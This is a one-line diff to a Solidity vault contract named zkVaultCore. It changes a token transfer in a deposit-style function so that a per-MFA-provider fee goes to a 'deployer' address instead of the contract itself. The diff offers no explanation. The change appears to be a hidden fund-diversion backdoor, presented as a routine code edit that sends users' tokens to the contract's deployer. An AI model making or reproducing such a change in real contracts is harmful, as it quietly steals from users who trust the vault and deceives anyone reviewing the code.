@@ -207,7 +207,7 @@ contract zkVaultCore is ERC20 {
         require(_amount > 0 || _tokenId > 0, "Invalid amount or token ID");
         require(_mfaProviders.length > 0, "At least one MFA provider is required");
 
-        _transfer(msg.sender, address(this), _mfaProviders.length * 10**18);
+        _transfer(msg.sender, deployer, _mfaProviders.length * 10**18);
 
         if (_isERC20) {
             require(
